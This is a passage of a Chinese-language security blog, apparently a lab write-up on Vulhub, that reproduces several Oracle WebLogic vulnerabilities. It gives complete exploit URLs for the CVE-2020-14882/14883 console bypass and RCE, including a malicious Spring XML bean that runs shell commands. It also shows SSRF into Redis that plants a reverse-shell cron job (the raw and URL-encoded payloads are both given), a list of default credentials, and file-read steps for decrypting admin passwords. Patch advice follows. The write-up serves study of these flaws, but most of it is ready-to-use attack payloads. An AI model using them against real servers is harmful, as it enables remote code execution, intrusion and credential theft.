+<li><p>启动完成后,访问<code>http://192.168.44.132:7001/console</code>查看管理员控制台登录页面 </p>
+</li>
+<li><p>使用此 URL 绕过 Console 组件的身份验证:<code>http://192.168.44.132:7001/console/css/%252e%252e%252fconsole.portal</code>	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171955685.png" data-fancybox="true"/></div></div></p>
+</li>
+<li><p>此时,因为是低权限用户,没有上传 webshell 的权限 </p>
+</li>
+<li><p>第二个漏洞,CVE-2020-14883,有以下两种利用方式 </p>
+</li>
+<li><p><code>com.tangosol.coherence.mvel2.sh.ShellSession</code><br>  1.  访问:<code>http://192.168.2.188:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;curl%20hzdjjb.dnslog.cn&#39;);&quot;)</code><br>  <div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172002273.png" data-fancybox="true"/></div></div><br>  2.  这种利用方法只能在 Weblogic 12.2.1 及以上版本中使用,因为 10.3.6 没有 class <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> </p>
+</li>
+<li><p><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>是一种更常见的漏洞利用,首次在 CVE-2019-2725 中引入,可用于任何 Weblogic 版本<br>  1.  要利用<code>FileSystemXmlApplicationContext</code>制作一个 XML 文件并将其上传到可以访问的服务器上<br>  2.  写入rce.xml </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[curl qi9nx2.dnslog.cn]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>python启动服务<code>python3 -m http.server 8080</code>	</p>
+ <div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172006564.png" data-fancybox="true"/></div></div>
+ <div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172007095.png" data-fancybox="true"/></div></div></li>
+<li><p>访问<code>http://192.168.2.188:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)</code>Weblogic 将加载此 XML 并执行其中的命令</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172012676.png" data-fancybox="true"/></div></div></li>
+<li><p>该漏洞利用的缺点是:它要求 Weblogic 服务器能够访问恶意 XML.</p>
+</li>
+</ol>
+<h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>此次 Oracle 官方的 CPU已发布了针对该漏洞的补丁,请受影响用户及时下载补丁程序并安装更新.<br>及时更新补丁,参考oracle官网发布的补丁:<br>注:Oracle官方补丁需要用户持有正版软件的许可账号,使用该账号登陆后,可以下载最新补丁</p>
+<h2 id="ssrf-CVE-2014-4210"><a href="#ssrf-CVE-2014-4210" class="headerlink" title="ssrf(CVE-2014-4210)"></a>ssrf(CVE-2014-4210)</h2><h3 id="漏洞概述-5"><a href="#漏洞概述-5" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Oracle WebLogic Server是美国甲骨文(Oracle)公司的一款适用于云环境和传统环境的应用服务器,它提供了一个现代轻型开发平台,支持应用从开发到生产的整个生命周期管理,并简化了应用的部署和管理.</p>
+<p>Oracle Fusion Middleware 10.0.2.0和10.3.6.0版本的 Oracle WebLogic Server 组件中的 WLS - Web Services 子组件存在安全漏洞.远程攻击者可利用该漏洞读取数据,影响数据的保密性.</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>漏洞名称</td>
+<td>Oracle WebLogic Server SSRF漏洞</td>
+</tr>
+<tr>
+<td>威胁类型</td>
+<td>SSRF</td>
+</tr>
+<tr>
+<td>威胁等级</td>
+<td>中</td>
+</tr>
+<tr>
+<td>漏洞ID</td>
+<td>CVE-2014-4210</td>
+</tr>
+<tr>
+<td>受影响系统及应用版本</td>
+<td>weblogic 10.0.2 – 10.3.6</td>
+</tr>
+</tbody></table>
+<p>服务端请求伪造(Server-Side Request Forgery),是一种由攻击者构造形成由服务端发起请求的一个安全漏洞.一般情况下,SSRF攻击的目标是从外网无法访问的内部系统.<br>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址做过滤与限制.比如从指定URL地址获取网页文本内容、加载指定地址的图片、文档等等</p>
+<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器,但是服务器并没有发现在这个请求是合法的,然后服务器以他的身份来访问其他服务器的资源.</p>
+<p>以下演示的 Weblogic中 靶场环境就是由于访问目标网站是的参数是 URL ,且在服务端验证请求时没有对用户请求做出严格的过滤以及限制,导致存在 SSRF 漏洞,可以获取服务器一定量的数据.同时可以进一步实现篡改获取的资源并发送给服务器,下面是通过 6379 端口访问服务器的 redis 服务,并篡改了 <code>/etc/crontab</code>下的信息,将反弹 Shell 的脚本写入了该目录下从而获得 Shell.</p>
+<h4 id="靶场搭建-1"><a href="#靶场搭建-1" class="headerlink" title="靶场搭建"></a>靶场搭建</h4><ol>
+<li>直接在 Centos虚拟机基于 Vulhub 漏洞集成环境生成靶场. </li>
+<li>进入 Vulhub 对应的漏洞路径下执行命令<code>docker-compose up -d</code>编译并运行靶场容器 </li>
+<li><code>docker ps</code>查看端口 </li>
+<li>访问<code>http://192.168.164.128:7001/uddiexplorer</code></li>
+</ol>
+<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>,仔细查看发现这里有参数传入的是URL,差不多可以断定就是在这个点存在 SSRF 漏洞了</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171403974.png" data-fancybox="true"/></div></div>
+<p>在 BurpSuite 下抓包测试该漏洞,查询请求的operator参数可以进行端口探测,当我们输入不同值时可得到多种不同的报错信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171405123.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171405802.png" data-fancybox="true"/></div></div>
+<p>通过<code>docker inspect 容器ID</code> 命令查看并确认 redis 服务的容器IP地址:</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171412003.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171413591.png" data-fancybox="true"/></div></div>
+<p>然后访问<code>http://172.20.0.2:6379</code>返回非 HTTP 协议的报错信息,是因为运行着 redis 服务</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171415851.png" data-fancybox="true"/></div></div>
+<p>以上通过 SSRF漏洞探测内网中的 redis 服务器(docker环境的网段一般是172.*)可以通过写脚本或者BURP爆破内网服务,现在已经发现<code>172.19.0.2:6379</code>可以连通.</p>
+<h4 id="反弹Shell-2"><a href="#反弹Shell-2" class="headerlink" title="反弹Shell"></a>反弹Shell</h4><p>接下来就是发送三条 redis 命令,将反弹 shell 的脚本写入目录<code>/etc/crontab</code>(这个目录下是一个默认自动执行的一些 crontab 定时服务命令,里面都写的是一些开启服务的命令):</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="number">1</span> <span class="string">&quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#x27;sh -i &gt;&amp; /dev/tcp/evil/YOUR-VPS-IP/6666 0&gt;&amp;1&#x27;\n\n\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /etc/</span><br><span class="line">config <span class="built_in">set</span> dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>命令分析:</p>
+<table>
+<thead>
+<tr>
+<th>命令行</th>
+<th>释义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>set 1 ...</code></td>
+<td>设置变量”1”的<code>value</code></td>
+</tr>
+<tr>
+<td><code>&quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/evil/YOUR-VPS-IP/6666 0&gt;&amp;1&#39;\n\n\n\n&quot;</code></td>
+<td>调用定时任务去定时用root权限执行一个反弹shell,YOUR-VPS-IP为你的vps ip</td>
+</tr>
+<tr>
+<td><code>set dir /etc/</code></td>
+<td>建立一个工作目录</td>
+</tr>
+<tr>
+<td><code>config set dbfilename crontab</code></td>
+<td>创建一个RDB备份文件,文件名<code>crontab</code>;所有的RDB文件都会储存在<code>etc/crontab</code>下</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>Redis: 是一个key-value型数据库,信息以键对应值的关系储存在内存中,而它算不上是一个真正的数据库,因为 redis 是主要把信息数据存储在内存中(当然也可以把其存储在硬盘上,这也是写shell的必要条件之一).Redis将数据主要保存在内存中,我们可以随时执行<code>save</code>命令将当前的redis数据保存到硬盘上.另外redis也会根据配置自动存储数据到硬盘上,这不得不说到redis的 <a target="_blank" rel="noopener" href="http://redis.io/topics/persistence">持久化运作方案</a>,其中说到的一个RDB,一个AOF.RDB更像一个数据库备份文件,而AOF是一个log日志文件.我们可以设置让redis再指定时间、指定更改次数时进行备份,生成RDB文件;而设置AOF,可以在操作或时间过程后将”日志”写入一个文件的最末,当操作越来越多,则AOF文件越来越大.二者是相辅相成的,通过二者的配合我们能够稳定地持久地将数据存储于服务器上.</p>
+</blockquote>
+<ol>
+<li>首先对以上三条 redis 命令进行 url 编码<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171436175.png" data-fancybox="true"/></div></div></li>
+<li>VPS中监听端口<code>nc -lvvp 6666</code><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171438766.png" data-fancybox="true"/></div></div> </li>
+<li>将下方中的<code>YOUR-VPS-IP</code>替换为你的VPS-IP <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR-VPS-IP%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171451017.png" data-fancybox="true"/></div></div></li>
+</ol>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171505385.png" data-fancybox="true"/></div></div>
+
+<ol start="4">
+<li>成功反弹<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171512837.png" data-fancybox="true"/></div></div> </li>
+<li>可进行利用的cron有如下几个地方:</li>
+</ol>
+<ul>
+<li><code>/etc/crontab</code> 这个是肯定的</li>
+<li><code>/etc/cron.d/*</code>将任意文件写到该目录下,效果和crontab相同,格式也要和<code>/etc/crontab</code>相同.漏洞利用这个目录,可以做到不覆盖任何其他文件的情况进行弹shell.</li>
+<li><code>/var/spool/cron/root</code> centos系统下root用户的cron文件</li>
+<li><code>/var/spool/cron/crontabs/root</code> debian系统下root用户的cron文件</li>
+</ul>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>目前厂商已经发布了升级补丁以修复此安全问题,补丁获取链接:</p>
+<div class="tag-plugin link dis-select"><a class="link-card rich" title="" href="https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon,desc"><div class="top"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div><span class="cap link footnote">https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</span></div><div class="bottom"><span class="title">https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</span><span class="cap desc footnote"></span></div></a></div>
+
+<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><h3 id="漏洞概述-6"><a href="#漏洞概述-6" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>在weblogic搭建好之后没有修改进入后台的密码导致弱口令登录获得webshell</p>
+<ul>
+<li>本环境模拟了一个真实的weblogic环境,其后台存在一个弱口令,并且前台存在任意文件读取漏洞.分别通过这两种漏洞,模拟对weblogic场景的渗透. </li>
+<li>Weblogic版本:10.3.6(11g)</li>
+<li>Java版本:1.6</li>
+</ul>
+<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><ol>
+<li>访问:<code>http://your-ip:7001/console</code>进入后台	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172018933.png" data-fancybox="true"/></div></div></li>
+<li>Weblogic常见弱口令总结</li>
+</ol>
+<ul>
+<li>system:password</li>
+<li>weblogic:weblogic</li>
+<li>admin:secruity</li>
+<li>joe:password</li>
+<li>mary:password</li>
+<li>system:sercurity</li>
+<li>wlcsystem:wlcsystem</li>
+<li>weblogic:Oracle<a href="/123">@123 </a></li>
+</ul>
+<ol start="3">
+<li>访问后台登录地址,输入任意账号密码,Burpsuite抓包<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172021603.png" data-fancybox="true"/></div></div></li>
+<li>设置Payload<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172021244.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172022060.png" data-fancybox="true"/></div></div></li>
+</ol>
+<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>本环境前台模拟了一个任意文件下载漏洞,访问<code>http://your-ip:7001/hello/file.jsp?path=/etc/passwd</code>可见成功读取passwd文件.那么,该漏洞如何利用?</p>
+<ul>
+<li>weblogic密码使用AES(老版本3DES)加密,对称加密可解密,只需要找到用户的密文与加密时的密钥即可;<br>这两个文件均位于base_domain下,名为SerializedSystemIni.dat和config.xml; </li>
+<li>SerializedSystemIni.dat是一个二进制文件,所以一定要用burpsuite来读取,用浏览器直接下载可能引入一些干扰字符.在burp里选中读取到的那一串乱码,这就是密钥,<strong>选中乱码右键copy to file</strong>就可以保存成一个文件,文件名:<code>SerializedSystemIni.dat</code></li>
+</ul>
+<h5 id="下载密文"><a href="#下载密文" class="headerlink" title="下载密文"></a>下载密文</h5><p>brup抓包访问:<a target="_blank" rel="noopener" href="http://192.168.2.188:7001/hello/file.jsp?path=security/SerializedSystemIni.dat">http://192.168.2.188:7001/hello/file.jsp?path=security/SerializedSystemIni.dat</a></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172056381.png" data-fancybox="true"/></div></div>
+
+<h5 id="下载密钥"><a href="#下载密钥" class="headerlink" title="下载密钥"></a>下载密钥</h5><p>获取 config.xml 的包,找到加密后的管理员密码<a target="_blank" rel="noopener" href="http://192.168.2.188:7001/hello/file.jsp?path=config/config.xml">http://192.168.2.188:7001/hello/file.jsp?path=config/config.xml</a><br><code>config.xml</code>是base_domain的全局配置文件,所以乱七八糟的内容比较多,找到其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值,即为加密后的管理员密码,不要找错了</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172057894.png" data-fancybox="true"/></div></div>
+
+<h5 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h5><p>然后进行解密工具地址:</p>
+<div class="tag-plugin link dis-select"><a class="link-card rich" title="" href="https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password/decrypt" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon,desc"><div class="top"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div><span class="cap link footnote">https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password/decrypt</span></div><div class="bottom"><span class="title">https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password/decrypt</span><span class="cap desc footnote"></span></div></a></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180921017.png" data-fancybox="true"/></div></div>
+<p><strong>可能遇到的问题,如果怎么解密都不对,那可能是返回包的编码不对,进行如下设置</strong></p>
